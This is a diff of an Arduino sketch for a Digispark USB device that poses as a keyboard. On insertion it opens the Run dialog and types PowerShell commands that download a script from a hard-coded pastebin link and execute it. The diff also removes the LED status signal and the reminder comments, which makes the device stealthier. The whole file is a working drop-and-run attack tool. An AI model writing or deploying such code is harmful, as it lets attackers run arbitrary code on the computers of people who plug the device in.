@@ -1,15 +1,12 @@
 #include "DigiKeyboard.h"
 #define KEY_LEFT 0x50
-// CHANGE THE LINK BELOW BEFORE USING
-#define link "https://pastebin.com/raw/gFKxnfVD" // Add a link
+#define link "https://pastebin.com/raw/gFKxnfVD"
 void setup() {
-  pinMode(1, OUTPUT); // LED Setup
 }
 void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  digitalWrite(1, HIGH); // Turn on LED to signify task started
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
 
@@ -19,7 +16,6 @@ void loop() {
   DigiKeyboard.println("$client = new-object System.Net.WebClient");
   DigiKeyboard.println("Remove-Item $path -ErrorAction SilentlyContinue");
   DigiKeyboard.delay(500);
-  // MAKE SURE TO UPDATE THIS PASTEBIN ACCORDING TO THE SCRIPT.PS1
   DigiKeyboard.println("$client.DownloadFile(\""link"\", $path)");
   DigiKeyboard.delay(4000);
 
@@ -35,6 +31,5 @@ void loop() {
   DigiKeyboard.println("powershell.exe -File \"%USERPROFILE%\\script2.ps1\"");
   DigiKeyboard.delay(4000);
   DigiKeyboard.println("exit");
-  digitalWrite(1, LOW);
-  for(;;){}
+  for(;;){} 
 }
